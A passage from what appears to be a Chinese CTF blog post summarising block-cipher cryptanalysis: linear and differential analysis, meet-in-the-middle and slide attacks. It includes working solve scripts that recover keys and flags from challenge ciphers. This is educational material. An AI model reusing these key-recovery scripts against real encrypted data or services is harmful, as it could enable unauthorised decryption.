plain.append(pt)</span><br><span class="line">        io.sendline(pt)</span><br><span class="line">        ct = io.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">        cipher.append(ct)</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doxor</span><span class="params">(l1, l2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [x[<span class="number">0</span>] ^ x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> zip(l1, l2)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线性层</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(blk)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, SZ, <span class="number">8</span>):</span><br><span class="line">        cur = blk[k:k+<span class="number">8</span>]</span><br><span class="line">        cur = [(cur[i] * coef[i]) % <span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)]</span><br><span class="line">        bits = [bin(x)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">        bits = bits[<span class="number">-1</span>:] + bits[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            res.append(int(<span class="string">''</span>.join([x[i] <span class="keyword">for</span> x <span class="keyword">in</span> bits]), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitxor</span><span class="params">(n, mask)</span>:</span></span><br><span class="line">    bitlist = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> bin(n &amp; mask)[<span class="number">2</span>:]]</span><br><span class="line">    <span class="keyword">return</span> bitlist.count(<span class="number">1</span>) % <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sbox线性估计</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linearSbox</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> linearInput</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        si = sbox[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                a = bitxor(i, j) <span class="comment"># 线性估计输入</span></span><br><span class="line">                b = bitxor(si, k) <span class="comment"># 线性估计输出 </span></span><br><span class="line">                <span class="keyword">if</span> a == b:</span><br><span class="line">                    offset[j][k] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        offset[i] = [abs(x - <span class="number">128</span>) / <span class="number">256</span> <span class="keyword">for</span> x <span class="keyword">in</span> offset[i]]</span><br><span class="line">    <span class="keyword">for</span> linearOutput <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        cur = [x[linearOutput] <span class="keyword">for</span> x <span class="keyword">in</span> offset]</span><br><span class="line">        linearInput.append(cur.index(max(cur)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcOffset</span><span class="params">(pt, ct, j, guessed_key)</span>:</span>  <span class="comment"># 猜测第j段子密钥</span></span><br><span class="line">    pt = list(unhexlify(pt))</span><br><span class="line">    ct = list(unhexlify(ct))</span><br><span class="line">    ct[j] ^= guessed_key</span><br><span class="line">    ct[j] = sbox[ct[j]] <span class="comment"># sbox即为sboxi的逆</span></span><br><span class="line">    ct[j] = (ct[j] * coef[j]) % <span class="number">256</span></span><br><span class="line">    u1 = bitxor(pt[<span class="number">0</span>], linearInput[<span class="number">1</span> &lt;&lt; ((<span class="number">6</span> - j) % <span class="number">8</span>)])</span><br><span class="line">    u2 = bitxor(ct[j], <span class="number">0b10000000</span>)</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linearAttack</span><span class="params">()</span>:</span></span><br><span class="line">    key2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>): <span class="comment"># 第二轮子密钥的第i段</span></span><br><span class="line">        count = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        <span class="keyword">for</span> guessed_key <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            print(<span class="string">"[+] Cracking key...(&#123;&#125;-&#123;&#125;)"</span>.format(i, guessed_key))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">                <span class="keyword">if</span> calcOffset(plain[j], cipher[j], i, guessed_key) == <span class="literal">True</span>:</span><br><span class="line">                    count[guessed_key] += <span class="number">1</span></span><br><span class="line">        bias = [abs(x - <span class="number">5000</span>) / <span class="number">10000</span> <span class="keyword">for</span> x <span class="keyword">in</span> count]</span><br><span class="line">        key2.append(bias.index(max(bias)))</span><br><span class="line">    <span class="keyword">return</span> key2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span><span class="params">(key2)</span>:</span></span><br><span class="line">    ct = list(unhexlify(cipher[<span class="number">0</span>]))</span><br><span class="line">    pt = list(unhexlify(plain[<span class="number">0</span>]))</span><br><span class="line">    cur = doxor(ct, key2)</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    key = doxor(cur, pt) + key2</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(ct, key)</span>:</span></span><br><span class="line">    cur = doxor(ct, key[SZ:])</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = doxor(cur, key[:SZ])</span><br><span class="line">    <span class="keyword">return</span> cur</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(ct, key)</span>:</span></span><br><span class="line">    pt = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ct), SZ * <span class="number">2</span>):</span><br><span class="line">        block_ct = list(unhexlify(ct[i : i + SZ * <span class="number">2</span>]))</span><br><span class="line">        block_pt = decrypt_block(block_ct, key)</span><br><span class="line">        pt += bytes(block_pt)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    getData(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    linearSbox()</span><br><span class="line">    key2 = linearAttack()</span><br><span class="line">    key = getkey(key2)</span><br><span class="line">    print(key)</span><br><span class="line">    flag = decrypt(enc_flag, key)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>在轮次高的时候，线性分析的分析复杂度往往会更高，而且成功率有所降低，具体视题目而定</p><h3 id="中间相遇攻击"><a href="#中间相遇攻击" class="headerlink" title="中间相遇攻击"></a>中间相遇攻击</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h4><p>以下基本原理参照ctf-wiki</p><p>假设 E 和 D 分别是加密函数和解密函数，$k_{1}$ 和 $k_2$ 分别是两次加密使用的密钥，则我们有</p><script type="math/tex; mode=display">C=E_{k_2}(E_{k_1}(P))\\P=D_{k_2}(D_{k_1}(C))</script><p>暴力枚举$(k_{1},k_{2})$的组合对应时间复杂度为$O(N^{2})$，而基于$E_{k_1}(P)=D_{k_2}(C)$这一事实</p><p>我们可以将$E_{k_1}(P)$和$D_{k_2}(C)$制成两张容量均为N的映射表，取交集即可获得中间态，进而恢复出两轮密钥</p><p>最好不要在求解第二张映射表的同时查表（这会使得查找耗费的时间大大增加），以两张完整表取交集即可</p><p>2020-BBCTF的经典例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">key1 = <span class="string">'0'</span>*<span class="number">13</span> + <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">key2 = <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]) + <span class="string">'0'</span>*<span class="number">13</span></span><br><span class="line"></span><br><span class="line">cipher1 = AES.new(key=key1, mode=AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key=key2, mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nGive me a string:"</span></span><br><span class="line">pt = raw_input()</span><br><span class="line"></span><br><span class="line">val = len(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">    pt += <span class="string">'0'</span>*(<span class="number">16</span> - val)</span><br><span class="line"></span><br><span class="line">c1 = cipher1.encrypt(pt.encode(<span class="string">'hex'</span>))</span><br><span class="line">c2 = cipher2.encrypt(c1.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Encrypted string:\n'</span> + c2.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip()</span><br><span class="line"><span class="comment"># length of flag is a multiple of 16</span></span><br><span class="line">ct1 = cipher1.encrypt(flag.encode(<span class="string">'hex'</span>))</span><br><span class="line">ct2 = cipher2.encrypt(ct1.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\nEncrypted Flag:\n'</span> + ct2.encode(<span class="string">'hex'</span>) + <span class="string">'\n'</span></span><br></pre></td></tr></table></figure><p>采用中间相遇攻击即可将时间复杂度控制在$O(2\cdot 100^{3})$下</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[27]:</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> itertools, string</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[37]:</span></span><br><span class="line">crack_range = list(itertools.product(string.printable, string.printable, string.printable))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[50]:</span></span><br><span class="line">pt = hexlify(<span class="string">b'aaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">key_known = <span class="string">'0'</span> * <span class="number">13</span></span><br><span class="line">c1 = []</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> suffix <span class="keyword">in</span> crack_range:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cnt % <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/1000000"</span>.format(cnt), end=<span class="string">""</span>)</span><br><span class="line">    key1 = (key_known + (<span class="string">''</span>.join(suffix))).encode()</span><br><span class="line">    cipher1 = AES.new(key1, AES.MODE_ECB)</span><br><span class="line">    c1.append(cipher1.encrypt(pt))</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[51]</span></span><br><span class="line">c1 = [hexlify(c) <span class="keyword">for</span> c <span class="keyword">in</span> c1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[54]</span></span><br><span class="line">c1_set = set(c1)</span><br><span class="line">c2 = unhexlify(<span class="string">b'ef92fab38516aa95fdc53c2eb7e8fe1d5e12288fdc9d026e30469f38ca87c305ef92fab38516aa95fdc53c2eb7e8fe1d5e12288fdc9d026e30469f38ca87c305'</span>)</span><br><span class="line">inv_c1 = []</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> prefix <span class="keyword">in</span> crack_range:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cnt % <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/1000000"</span>.format(cnt), end=<span class="string">""</span>)</span><br><span class="line">    key2 = ((<span class="string">''</span>.join(prefix)) + key_known).encode()</span><br><span class="line">    cipher2 = AES.new(key2, AES.MODE_ECB)</span><br><span class="line">    inv_c1.append(cipher2.decrypt(c2))</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[78]</span></span><br><span class="line">inv_c1_set = set(inv_c1)</span><br><span class="line">mid_cipher = list(c1_set &amp; inv_c1_set)[<span class="number">0</span>]</span><br><span class="line">key1_pos = c1.index(mid_cipher)</span><br><span class="line">key2_pos = inv_c1.index(mid_cipher)</span><br><span class="line">key1 = (key_known + (<span class="string">''</span>.join(crack_range[key1_pos]))).encode()</span><br><span class="line">key2 = ((<span class="string">''</span>.join(crack_range[key2_pos])) + key_known).encode()</span><br><span class="line">cipher1 = AES.new(key1, AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key2, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[78]</span></span><br><span class="line">cipher = unhexlify(<span class="string">b'fa364f11360cef2550bd9426948af22919f8bdf4903ee561ba3d9b9c7daba4e759268b5b5b4ea2589af3cf4abe6f9ae7e33c84e73a9c1630a25752ad2a984abfbbfaca24f7c0b4313e87e396f2bf5ae56ee99bb03c2ffdf67072e1dc98f9ef691db700d73f85f57ebd84f5c1711a28d1a50787d6e1b5e726bc50db5a3694f576'</span>)</span><br><span class="line">flag = unhexlify(cipher1.decrypt(unhexlify(cipher2.decrypt(cipher))))</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[79]</span></span><br><span class="line"><span class="string">b'flag&#123;y0u_m@d3_i7_t0_7h3_m1dddl3&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="差分分析"><a href="#差分分析" class="headerlink" title="差分分析"></a>差分分析</h3><h4 id="Theorem-0"><a href="#Theorem-0" class="headerlink" title="Theorem-0"></a>Theorem-0</h4><p>差分分析基本思想：选择大量的候选明文差分对，对应密文差分的影响来恢复尽可能多的密钥. 差分$\Delta X_{i}=X_{i}\oplus X_{i}^{*}$.</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_14-30-05.png" alt></p><p>差分分析符号定义如下：</p><script type="math/tex; mode=display">(\Delta X_{i},\Delta Y_{i}):=Prob\{F_{i}(X_{i}\oplus\Delta X_{i},K_{i})=F_{i}(X_{i},K_{i})\oplus\Delta Y_{i}\}\\[p_{1},p_{2},...p_{t}]=\prod_{i=1}^{t}p_{i}\\B_{n}:=max_{\Delta X_{i}=\Delta X_{i-2}\oplus\Delta Y_{i-1}(3\leq i\leq n)}[(\Delta X_{1},\Delta Y_{1}),(\Delta X_{2},\Delta Y_{2}),...,(\Delta X_{n},\Delta Y_{n})]</script><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem-1"></a>Theorem-1</h4><p>下介绍如何高效搜索Feistel-SP结构分组密码的多轮高概率差分路径.</p><p>Matsui的原算法如下：</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_15-55-25.png" alt></p><blockquote><p>Matsui’s algorithm works by induction on the number of rounds and derives the best <em>n</em>-round weight <em>B_n</em> from the knowledge of all <em>i</em>-round best weight <em>B_i</em> (1 <em>≤</em> <em>i</em> <em>≤</em> <em>n-1</em>).</p></blockquote><p>且原始的递归深搜算法复杂度相对高，因此在其基础上进行剪枝.</p><ul><li><p><strong>重构S盒差分分布表，将其转化为密集型哈希表</strong>。python用字典实现即可(输入差分→输出差分→概率)</p></li><li><p><strong>基于向量剪枝的优化Matsui算法</strong></p><p>在基于字节剪枝的Matsui算法中，频繁的穷尽搜索$2^{32}$或$2^{64}$，因此使用向量递归调用，尽可能早的过滤不满足的$\Delta X_{i}$和$\Delta Y_{i}$.</p><p>以下是对Round-2的算法剪枝，后续轮也可采用相似算法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Call Procedure Round-2-1</span><br><span class="line">Return to the upper procedure.</span><br></pre></td></tr></table></figure><p><strong>Procedure Round-2-j (1 &lt;= j &lt;= 8):</strong></p><p>For each candidate for $\Delta X_{2}^{j}$ and $\Delta Y_{2}^{j}$,do:</p><ul><li><p>$\quad p_{2}^{j} = (\Delta X_{2}^{j}, \Delta Y_{2}^{j})$ and $p_{2} = [p_{2}^{1}, …, p_{2}^{j}]$;</p></li><li><p>$\quad if\ [p_{1}, p_{2}, B_{n-2}]&lt; \bar{B_{n}}$, then <strong>continue</strong>;</p></li><li><p>$\quad if\ [p_{1}, p_{2}, B_{n-2}]\geq \bar {B_{n}}$:</p><p>​        if $j\neq 8$, then call <strong>Procedure Round-2-(j+1)</strong>;</p><p>​        else call <strong>Procedure Round-3</strong>;</p></li></ul></li></ul><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem-2"></a>Theorem-2</h4><p>差分过程可以简单归纳为</p><p>(1) 采样：选择大量合适的明文对(满足差分)，并获得相应的密文对；</p><p>(2) 去噪，通过观察密文对差分的一些特性，提早过滤一部分不正确的明文对，排除干扰；</p><p>(3) 提取信息，对过滤后的数据和每个猜测密钥进行统计分析，恢复正确轮密钥(部分比特)；</p><p>m: 样本量大小; p: 差分区分器概率; $\upsilon$: 平均每个密文对蕴含的密钥数;</p><p>l: 攻击所猜测的密钥量; $\lambda$: 去噪阶段的过滤系数</p><p><strong>注</strong>：其中$\upsilon$与S盒差分分布表有关，大致估计方法可以为：</p><p>(e.g.) S盒6进4出，平均意义上差分分布表的取值为$2^{6}/2^{4}=4$. 假设一次攻击猜测4个S盒对应的密钥，则该参数可估计为$4^{4}=2^{8}$.</p><p>则正确密钥至少被统计了$mp$次，所有猜测密钥平均被统计了$\frac{m\lambda\upsilon}{2^{l}}$次，则信噪比</p><script type="math/tex; mode=display">S/N=\frac{mp}{m\lambda\upsilon/2^{l}}=\frac{p\cdot 2^{l}}{\lambda\upsilon}.</script><p>信噪比越大，即正确密钥被统计次数相对越多，更容易在计数器中被区分，从而降低选择明文攻击的明文量</p><p>$m\approx \frac{c}{p},c=constant$. 以Shamir提出的DES相关实验数据为例：</p><p>$S/N\in [1,2]$，c取值$[20,40]$；$S/N$更大时，c取值$[3,4]$.</p><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem-3"></a>Theorem-3</h4><p>对n轮Feistel的差分攻击，一般性上往往是1-R攻击，至于m-R攻击（如对八轮DES的3-R差分攻击），尽管差分特征概率会有所降低，但往往需要根据具体S盒P盒进行更特殊的构造，而非直接利用搜索到的n-1轮高概率差分特征进行攻击。</p><p>且对于<strong>非双射</strong>关系的S盒（如DES六进四出的S盒），即可能存在两轮迭代差分特征，如下图所示：</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/QQ图片20200726134141.jpg" alt></p><p>因为该类的S盒存在输入差分不为0，但输出差分为0的情况，在Pro(in, 0)较大时，我们就能利用二轮迭代差分特征实现2n+1(n&gt;=1)轮Feistel的1-R攻击（完全依赖于S盒特性及相邻S盒间关系）</p><p>搜索仅sbox[i]~sbox[j]激活的二轮迭代差分特征可采用以下递归算法实现（以下算法基于DES的E函数（F函数第一步）扩展）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2-round iterative differential feature (sbox[i]~sbox[j])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_path</span><span class="params">(pre, i, j)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> dif_dist</span><br><span class="line">    sub_pro = <span class="number">1</span></span><br><span class="line">    max_pro = sub_pro</span><br><span class="line">    cur_path, path = <span class="literal">None</span>, []</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dif_dist[i].keys():</span><br><span class="line">        <span class="keyword">if</span> key[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> ((key[<span class="number">0</span>] &amp; <span class="number">0b110000</span>) &gt;&gt; <span class="number">4</span>) == (pre &amp; <span class="number">0b000011</span>):</span><br><span class="line">            <span class="keyword">if</span> i == j <span class="keyword">and</span> (key[<span class="number">0</span>] &amp; <span class="number">0b000011</span>) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            value = dif_dist[i][key]</span><br><span class="line">            <span class="keyword">if</span> value % <span class="number">64</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; j:</span><br><span class="line">                path, sub_pro = find_path(key[<span class="number">0</span>], i + <span class="number">1</span>, j)</span><br><span class="line">            <span class="keyword">if</span> value * sub_pro &gt; max_pro:</span><br><span class="line">                max_pro = value * sub_pro</span><br><span class="line">                cur_path = [key[<span class="number">0</span>]] + path</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cur_path:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> cur_path, max_pro <span class="comment"># pro = max_pro / (64 ** (j - i + 1))</span></span><br></pre></td></tr></table></figure><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p>以WMCTF出的idiot box为例，我的本意是S盒随机shuffle生成，key不变，动态请求靶机直至找到使高概率二轮迭代差分特征存在的S盒，但阿里云频繁remote真的慢慢慢慢慢慢，还会被banip</p><p>version1的exp是一次攻击两个相邻S盒，分四段得到第六轮的子密钥，但是因为上述原因改了- -</p><p>改成静态S盒后，又有一样的问题，拿差分攻击要的明密文对本地秒出，但是docker挂载阿里云以后发现取$2^{12}$个明文对都要三分钟- -NM$L</p><p>于是version1的exp因为每段要取$2^{14}$个明文对，分四段（$2^{16}$对），改成了version2每段取$2^{12}$个明文对，分八段（$2^{15}$对）</p><p>Sbox也改成了根本就不符合S盒定义的Sbox，因为其实是不存在针对单个S盒的二轮迭代的（因为由E扩展函数知，该迭代差分特征要求输入差分为$00x_{1}x_{2}00$（即明文对处于同行），所以不可能存在满足该差分输入的明文对同时满足差分输出为0）</p><p>歪日，👴真的吐了，version1远程exp估计要跑将近1h，相较之下version2的exp将近30min，还算能接受…吧</p><p>这里给出我version1的本地测试exp，就不放WMCTF上的版本了（这个根本称不上是S盒的Sbox一直有、膈应</p><p><a href="idiot box-version 1.ipynb">Click Here to Download idiot box-version 1</a></p><p>再做下exp里一些部分的解释：</p><ol><li><p>针对相邻两个S盒的find_path：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> max_pro &lt; <span class="number">192</span>: <span class="comment"># find suitable sbox</span></span><br></pre></td></tr></table></figure><p>要求max_pro &lt; 192的原因是要令S/N足够大，$S/N\geq\frac{2^{12}(\frac{192}{64*64})^{2}}{4^{2}}\geq 0.5625$，因此可将c暂取为40，$m=c/p\leq 40\frac{64^{4}}{192^{2}}\approx 18204$，所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">2</span>**(<span class="number">4</span>*(right-left+<span class="number">1</span>)))):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">3</span>):</span><br><span class="line">     <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">3</span>):</span><br></pre></td></tr></table></figure><p>每次取$2^{14}$个明文对，并同时通过密文右半部分差分过滤错误对</p></li><li><p>关于选择明文攻击时明文shift的解释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i_shift = <span class="number">60</span> - right * <span class="number">4</span></span><br><span class="line">j_shift = (i_shift - <span class="number">3</span>) % <span class="number">32</span> + <span class="number">32</span></span><br><span class="line">k_shift = (i_shift + <span class="number">4</span> * (right - left + <span class="number">1</span>)) % <span class="number">32</span> + <span class="number">32</span></span><br></pre></td></tr></table></figure><p>选取的明文对注意一定要激活差分特征上的活跃S盒</p></li><li><p>密钥计数器得到的最后一轮候选子密钥可能存在多解，验证校验明文即可</p></li></ol><h3 id="滑动攻击"><a href="#滑动攻击" class="headerlink" title="滑动攻击"></a>滑动攻击</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h4><p><a href="https://0xdktb.top/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/" target="_blank" rel="noopener">https://0xdktb.top/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/</a></p><p><a href="http://theamazingking.com/crypto-slide.php" target="_blank" rel="noopener">http://theamazingking.com/crypto-slide.php</a></p><h3 id="Group-Mode-ECB"><a href="#Group-Mode-ECB" class="headerlink" title="Group Mode(ECB)"></a>Group Mode(ECB)</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/ecb_encryption.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/ecb_decryption.png" alt></p><p>以i春秋2020公益赛NewsWebsite为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span 